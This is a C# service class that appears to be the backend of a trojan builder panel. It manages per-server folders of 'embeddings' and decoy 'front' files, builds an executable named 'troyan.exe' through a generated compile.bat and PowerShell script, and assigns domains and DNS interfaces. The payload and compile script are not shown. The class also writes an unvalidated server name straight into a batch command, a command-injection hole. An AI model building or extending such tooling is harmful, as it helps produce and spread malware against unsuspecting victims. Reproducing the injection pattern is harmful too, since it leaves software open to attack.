using System.Diagnostics;
using System.Management.Automation;
using System.Text;
using System.Text.Json;
using cp.Code;
using cp.Models;

namespace cp.Services;

public class ServerService
{
    private static string RootDataDir
    {
        get
        {
            return @"C:\data";
        }
    }
    
    internal static string RootDir
    {
        get
        {
            if (System.IO.Directory.Exists(@"C:\hephaestus"))
                return @"C:\hephaestus";
            if (System.IO.Directory.Exists(@"C:\users\kgons\source\repos\hephaestus"))
                return @"C:\users\kgons\source\repos\hephaestus";
            throw new InvalidOperationException();
        }
    }
    
    internal static string ServakDir
    {
        get
        {
            return Path.Combine(RootDir, "servak");
        }
    }
    
    public string ServerCompileBat(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "compile.bat");
    }
    
    private static string ServerDir(string serverName)
    {
        return Path.Combine(RootDataDir, serverName);
    }
    
    public string EmbeddingsDir(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "embeddings");
    }
    
    public string FrontDir(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "front");
    }

    private static string DataFile(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "server.json");
    }
    
    public string GetIcon(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "server.ico");
    }

    public string GetExe(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "troyan.exe");
    }
    
    public string BuildExe(string serverName, string url)
    {
        return Path.Combine(ServerDir(serverName), "troyan.exe");
    }
    
    public string GetEmbedding(string serverName, string embeddingName)
    {
        return Path.Combine(EmbeddingsDir(serverName), embeddingName);
    }
    
    public void DeleteEmbedding(string serverName, string embeddingName)
    {
        File.Delete(GetEmbedding(serverName, embeddingName));
    }
    
    public string GetFront(string serverName, string embeddingName)
    {
        return Path.Combine(FrontDir(serverName), embeddingName);
    }
    
    public void DeleteFront(string serverName, string embeddingName)
    {
        File.Delete(GetFront(serverName, embeddingName));
    }

    public ServerModel? GetServer(string serverName)
    {
        if (!Directory.Exists(ServerDir(serverName)))
            return null;
        
        var server = new ServerModel();
        try
        {
            server = JsonSerializer.Deserialize<ServerModel>(File.ReadAllText(DataFile(serverName)))!;
        }
        catch
        {

            File.WriteAllText(DataFile(serverName),
                JsonSerializer.Serialize(new ServerModel() { Server = serverName },
                    new JsonSerializerOptions() { WriteIndented = true }));
        }

        server.Server = serverName;

        server.Interfaces = new PsList(server).Run().Where(a => a != server.Server).ToList();
    
        UpdateIpDomains(server);
    
        server.PrimaryDns = server.Interfaces[0];
        server.SecondaryDns = server.PrimaryDns;
        if (server.Interfaces.Count >= 2)
            server.SecondaryDns = server.Interfaces[1];

        server.Embeddings = new List<string>();
        if (Directory.Exists(EmbeddingsDir(serverName)))
            server.Embeddings = Directory.GetFiles(EmbeddingsDir(serverName)).Select(a => Path.GetFileName(a))
                .ToList();
        
        server.Front = new List<string>();
        if (Directory.Exists(FrontDir(serverName)))
            server.Front = Directory.GetFiles(FrontDir(serverName)).Select(a => Path.GetFileName(a))
                .ToList();
        return server;
    }

    public void UpdateIpDomains(ServerModel server)
    {
        while (server.Domains.Count < server.Interfaces.Count)
            server.Domains.Add("test.com");
        var zippedDictionary = server.Interfaces.Zip(server.Domains, (iface, domain) => new { Interface = iface, Domain = domain })
            .Where(pair => server.Domains.Contains(pair.Domain))
            .ToDictionary(pair => pair.Interface, pair => pair.Domain);
        server.IpDomains = zippedDictionary;
    }

    public string PostServer(string serverName, ServerModel serverModel, string action)
    {
        if (!Directory.Exists(ServerDir(serverName)))
            return $"Server {serverName} is not registered";
        
        UpdateIpDomains(serverModel);
        
        File.WriteAllText(DataFile(serverName), JsonSerializer.Serialize(serverModel, new JsonSerializerOptions(){WriteIndented = true}));
        
        System.IO.File.WriteAllText(Path.Combine(ServerDir(serverName),"compile.bat"),$@"powershell -File {RootDir}\compile.ps1 -serverName {serverModel.Server}");
        
        var result = RunCompileBat( serverModel) ;
        
        return result;
    }
    
    public string RunCompileBat( ServerModel serverModel)
    {
        var file = ServerCompileBat(serverModel.Server);
        using (Process process = new Process())
        {
            process.StartInfo.FileName = file;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WorkingDirectory = ServerDir(serverModel.Server);

            StringBuilder output = new StringBuilder();
            StringBuilder error = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    output.AppendLine(e.Data);
                }
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    error.AppendLine(e.Data);
                }
            };

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();

            return error.ToString() + "\r\n" + output.ToString();
        }
    }
}